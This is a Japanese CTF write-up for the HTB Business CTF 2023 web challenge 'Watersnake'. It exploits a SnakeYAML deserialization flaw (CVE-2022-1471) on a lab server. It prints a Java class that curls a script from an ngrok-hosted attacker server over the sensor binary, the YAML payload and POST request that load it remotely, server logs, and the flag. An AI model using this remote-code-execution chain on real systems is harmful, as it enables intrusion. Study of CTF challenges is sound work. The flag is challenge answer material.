---
layout: post
title: "[Web] Watersnake (300 pts, 276 solved)"
published : true
permalink: /ctf/writeups/HTB_Business_CTF_2023/Web_Watersnake
tags: [CTF, WriteUps, HTB Business CTF]
---
## Description
As the United Nations of Zenium and the Board of Arodor engage in a fierce competition to establish a colony on Mars using Vitalium. State hackers from UNZ identify an exposed instance of the critical facility water management software, Watersnakev3, in one of Arodor's main water treatment plants. The objective is to gain control over the water supply, and weaken the Arodor's infrastructure.

## Solution
問題のサーバで動作している"snake YAML"には脆弱性(CVE-2022-1471)があるため、それを悪用する。

参考URL: https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858

まずは、以下のURLからエクスプロイトを入手する。

URL:　https://github.com/1fabunicorn/SnakeYAML-CVE-2022-1471-POC/blob/main/src/main/java/org/example/exploit.java

"AwesomeScriptEngineFactory.java" を以下のコードに修正する。このコードにより、サーバの機能の一部であるセンサーの実行ファイル(/app/watersensor)を、攻撃者のホストするシェルスクリプトで置き換えることができる。

なお、攻撃者のサーバはngrokを使用してホストした。

```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            //Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
            Runtime.getRuntime().exec("curl https://8128-2404-7a80-93e0-6800-5054-ff-fe4e-76fc.ngrok-free.app/exploit.sh -o /app/watersensor");
            Runtime.getRuntime().exec("chmod 777 /app/watersensor");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```

コンパイルしてclassファイルを生成する。

```sh
┌──(kali㉿kali)-[/ctf/…/web/Watersnake/yaml-payload/src]
└─$ javac artsploit/AwesomeScriptEngineFactory.java; ll artsploit/AwesomeScriptEngineFactory.*
-rwxr-xr-x 1 kali kali 1733 Jul 16 00:43 artsploit/AwesomeScriptEngineFactory.class
-rwxr-xr-x 1 kali kali 1707 Jul 16 00:43 artsploit/AwesomeScriptEngineFactory.java
```

次にホストするシェルスクリプトを用意する。中身は単純に"/flag.txt"をcatで読み込むだけのもの。


- exploit.sh

```sh
#!/bin/sh
cat /flag.txt
```

配置する場所は、コンパイルしたclassファイルがある場所と同じところにする。

```sh
┌──(kali㉿kali)-[/ctf/…/web/Watersnake/yaml-payload/src]
└─$ cat exploit.sh
#!/bin/sh
cat /flag.txt 
```

classファイルとシェルスクリプトがあるフォルダをルートとしてWebサーバをホストする。

```
┌──(kali㉿kali)-[/ctf/…/web/Watersnake/yaml-payload/src]
└─$ python3 -m http.server 80
```

別のシェルでngrokを起動する。

```sh

┌──(kali㉿kali)-[/ctf/…/htb/HTB Business CTF 2023/web/Watersnake]
└─$ ngrok http 80
ngrok                                                                                                                                                    (Ctrl+C to quit)

🤯 Try the ngrok Kubernetes Ingress Controller: https://ngrok.com/s/k8s-ingress

Session Status                online
Account                       0x005ada15 (Plan: Free)
Version                       3.0.6
Region                        Japan (jp)
Latency                       5ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    https://8128-2404-7a80-93e0-6800-5054-ff-fe4e-76fc.ngrok-free.app -> http://localhost:80

Connections                   ttl     opn     rt1     rt5     p50     p90
                              29      0       0.00    0.01    0.01    0.02
```

生成されたngrokのURLを使い、ペイロードを作成する。

元のペイロード: `some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://8128-2404-7a80-93e0-6800-5054-ff-fe4e-76fc.ngrok-free.app/"]]]]`

URLエンコードしたペイロード: `some%5Fvar%3A%20%21%21javax%2Escript%2EScriptEngineManager%20%5B%21%21java%2Enet%2EURLClassLoader%20%5B%5B%21%21java%2Enet%2EURL%20%5B%22https%3A%2F%2F8128%2D2404%2D7a80%2D93e0%2D6800%2D5054%2Dff%2Dfe4e%2D76fc%2Engrok%2Dfree%2Eapp%2F%22%5D%5D%5D%5D`

URLエンコードしたペイロードを/updateにPOSTする

```
POST /update HTTP/1.1
Host: 83.136.255.177:59601
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 255

config=some%5Fvar%3A%20%21%21javax%2Escript%2EScriptEngineManager%20%5B%21%21java%2Enet%2EURLClassLoader%20%5B%5B%21%21java%2Enet%2EURL%20%5B%22https%3A%2F%2F8128%2D2404%2D7a80%2D93e0%2D6800%2D5054%2Dff%2Dfe4e%2D76fc%2Engrok%2Dfree%2Eapp%2F%22%5D%5D%5D%5D
```

ngrokを経由して、ホストしたWebサーバにアクセスがくる。
そして、exploit.shが実行される。

```sh
┌──(kali㉿kali)-[/ctf/…/web/Watersnake/yaml-payload/src]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [16/Jul/2023 00:43:58] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
127.0.0.1 - - [16/Jul/2023 00:43:58] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
127.0.0.1 - - [16/Jul/2023 00:43:59] "GET /artsploit/AwesomeScriptEngineFactory.class HTTP/1.1" 200 -
127.0.0.1 - - [16/Jul/2023 00:43:59] "GET /exploit.sh HTTP/1.1" 200 -
```

/stats にアクセスすると、書き換えられた"/app/watersensor"が実行され、フラグが表示される。

Flag: `HTB{r1d3_th3_sn4k3}`